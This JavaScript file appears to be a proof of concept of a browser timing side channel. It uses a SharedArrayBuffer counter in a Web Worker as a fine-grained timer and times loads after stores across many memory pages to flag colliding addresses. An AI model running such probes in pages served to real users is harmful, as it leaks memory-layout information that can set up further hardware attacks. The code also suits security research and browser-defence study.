initSABCounterAndSearch();

function initSABCounterAndSearch(pageCount = 5000){
    var SABcounterWorker = getNewSABCounter();
    var sharedBuffer = new SharedArrayBuffer(Uint32Array.BYTES_PER_ELEMENT);
    var SABCounterArray = new Uint32Array(sharedBuffer);
    SABcounterWorker.postMessage(sharedBuffer);

    //get timer time to warm-up
    var millisecondsToWait = 500;
    setTimeout(function() {
        //timer returns valid results?
        var timeStamp = 0;
        while(SABCounterArray[0] == 0 || SABCounterArray[0] - timeStamp > 100){
            timeStamp = SABCounterArray[0];
        }
        findCollidingAdd(pageCount, SABCounterArray);

        //save some energy
        SABcounterWorker.terminate();
    }, 500);
}

function getNewSABCounter(){
    function SABcounterWorker(){
        self.addEventListener('message', (m) => {
            // Create an Int32Array on top of that shared memory area
            const sharedArray = new Uint32Array(m.data)
            
            while (1) {            
                sharedArray[0]++;
            }
            });
    }

    var SABcounterWorker;

    //browser security polices are fun!!!!!!!
    if(!!window.chrome && !!window.chrome.webstore){ //isChrome
        SABcounterWorker = new Worker(URL.createObjectURL(new Blob(["("+SABcounterWorker.toString()+")()"], {type: 'text/javascript'})));
    } else {
        if (typeof InstallTrigger !== 'undefined'){ /*isFirefox*/ } else {
            console.log("The Default Content Security Policies of your browser might be matchting with Firefox. Hope for the best!");
        }
        SABcounterWorker = new Worker("SABcounterWorker.js");
    }

    return SABcounterWorker;
}

//5 round is prob enough
function findCollidingAdd(pageCount, SABCounterArray, rounds = 100, windowSize = 64){
    var pageSize = 4096;
    var uint32Buffer = new Uint32Array(pageCount * (pageSize/4));
    var uint32Buffer2 = new Uint32Array(pageCount * (pageSize/4));
    var uint16MeasurementArr = new Uint16Array(pageCount);
    var detectionWindowSize = 10;
    var candidateIndex = 2*1024; //multiple of 1024!

    for (var p = windowSize; p < pageCount; p++) {
        var total = 0;

        for (var r = 0; r < rounds; r++) {
        // Stores
        for (var i = windowSize; i >= 0; i--) {
            //uint32Buffer[(p - i) * 1024] = 0;
            uint32Buffer[i * 1024] = 0;

            //uint32Buffer2[(p - i) * 1024] = 0;
        }
        uint32Buffer[p * 1024] = 0;
        // Measuring load
        var before = Atomics.load(SABCounterArray, 0);

        var val = uint32Buffer[candidateIndex];

        //insert some useless incrementations to get "superior" peaks
        //this incrementations stuff might not be needed on every system
        val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;val++;

        var after = val;

        after += Atomics.load(SABCounterArray, 0);
        total += (after - before) - val;
        }
        uint16MeasurementArr[p] = total / rounds;
    }

    //output times, mark possible colliding addresses with a "###"
    //value between "()" is the difference to last colliding address
    var lock = 0, diff=0;
    var output = "";
    for(var p = windowSize; p < pageCount; p++) {
        if(p > windowSize + detectionWindowSize 
        && lock < 0 
        && collidingAddressCheck(uint16MeasurementArr, p, detectionWindowSize)){
            lock = 10;
            output += "###("+ diff + ")";
            diff = 1;
        } else{
            lock--;
            diff++;
        }

        output += " " + uint16MeasurementArr[p];
        if(uint16MeasurementArr[p] > 45){
            output += "##";
        }
    }
    console.log(output);
}

function subArrayAverage(arr, start, detectionWindowSize) {
    var sum = 0;
    for (var i = 0; i < detectionWindowSize; i++) {
    sum += arr[start + i];
    }
    return sum / detectionWindowSize;
}

function collidingAddressCheck(measurementArr, p, detectionWindowSize) {      
    var movingWindowAverage = subArrayAverage(
        measurementArr, p - detectionWindowSize - 1, detectionWindowSize);
    
    if (measurementArr[p] < 100 && measurementArr[p-1] < 100 && 
    measurementArr[p] > movingWindowAverage + 5 &&
    measurementArr[p-1] > movingWindowAverage + 10 &&
    measurementArr[p-1] > measurementArr[p-2] + 10) {
    return true;
    }
    return false;
}
